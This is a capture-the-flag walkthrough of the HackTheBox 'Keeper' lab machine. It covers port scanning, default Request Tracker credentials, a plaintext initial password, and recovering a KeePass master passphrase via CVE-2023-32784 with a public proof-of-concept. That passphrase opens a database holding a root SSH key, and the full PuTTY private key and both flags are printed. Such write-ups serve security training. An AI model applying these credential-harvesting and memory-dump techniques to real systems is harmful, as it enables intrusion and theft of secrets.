## HackTheBox Keeper

Easy level HackTheBox platform lab machine running Linux OS, containing a standard password, password transmission using an open communication channel and its untimely change, exploiting a vulnerability in Keepass.

## Service Overview

The machine is assigned IP address 10.10.11.227, let's scan the ports with Nmap:

```bash
$ nmap -sV -sC -Pn -p1-65535 -oN 10.10.11.227 10.10.11.227
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Service

On port 80, we are immediately pointed to two domain names.
We need to add keeper.htb and tickets.keeper.htb to /etc/hosts:

```bash
10.10.11.227 keeper.htb tickets.keeper.htb
```

Request Tracker (RT 4.4.4.4+dfsg-2ubuntu1 (Debian)) is running on tickets.keeper.htb.
After trying some password combinations without success, we finally get the ```root:password``` account.

The ticket reveals a problem with Keepass. Let's pay attention to the Danish usernames. In the user section http://tickets.keeper.htb/rt/Admin/Users/ we find the user ```lnorgaard:Welcome2023!```.

```bash
27 	lnorgaard 	Lise Nørgaard 	lnorgaard@keeper.htb 	Enabled
Comments about this user 
New user. Initial password set to Welcome2023!

14 	root 	Enoch Root 	root@localhost 	Enabled
```

## User flag
Use them to access SSH.

```bash
$ ssh lnorgaard@10.10.11.227
Welcome2023!
lnorgaard@keeper:~$ id
uid=1000(lnorgaard) gid=1000(lnorgaard) groups=1000(lnorgaard)
lnorgaard@keeper:~$ ls
KeePassDumpFull.dmp  RT30000.zip  passcodes.kdbx  user.txt
lnorgaard@keeper:~$ cat user.txt
faa16f84c4bd32e64845c9651522850b
lnorgaard@keeper:~$
```

## Privilege escalation

In the user directory /home/lnorgaard we see the file RT30000.zip. In the Windows application crash ticket it was written that the memory dump was removed from the ticket for security reasons and placed in the home directory.

Let's download this file for local research:

```bash
$ scp lnorgaard@10.10.11.227:~/RT30000.zip .
lnorgaard@10.10.11.227's password: Welcome2023!
```

Inside the archive is a file with memory dump and Keepass base:

```bash
$ unzip RT30000.zip
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp

 extracting: passcodes.kdbx

$ file passcodes.kdbx
passcodes.kdbx: Keepass password database 2.x KDBX

$ file KeePassDumpFull.dmp
KeePassDumpFull.dmp: Mini DuMP crash report, 16 streams, Fri May 19 13:46:21 2023, 0x1806 type
```

It looks like we're facing CVE-2023-32784. We can find almost the entire password from the memory dump.

```bash
$ git clone https://github.com/CMEPW/keepass-dump-masterkey
$ cd /opt/keepass-dump-masterkey
$ python3 poc.py /root/KeePassDumpFull.dmp
2023-09-08 17:50:46,382 [.] [main] Opened /root/KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

It looks like a passphrase, so we try a google search for med flode, given that the users are Danish.
Apply the lowercase function to the passphrase and get ```rødgrød med fløde```. Use this password to open passcodex.kdbx database.

In the Network category, find the Putty private key:

```bash
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

Convert with puttygen (conversions => Export OpenSSH key):

```bash
$ wget https://the.earth.li/~sgtatham/putty/0.76/putty-0.76.tar.gz
$ tar -xvf putty-0.76.tar.gz
$ cd putty-0.76/
$ ./configure
$ make
$ sudo cp puttygen /usr/bin/

$ putty-0.76/puttygen ssh-rsa.ppk -O private-openssh -o id_rsa
```

Let's connect with this key as root and get root flag:

```bash
$ ssh -i id_rsa root@10.10.11.227
root@keeper:~# id
uid=0(root) gid=0(root) groups=0(root)
root@keeper:~# ls
RT30000.zip  SQL  root.txt
root@keeper:~# cat root.txt
19ad20c7b763f30208fbb19e30eb7634
```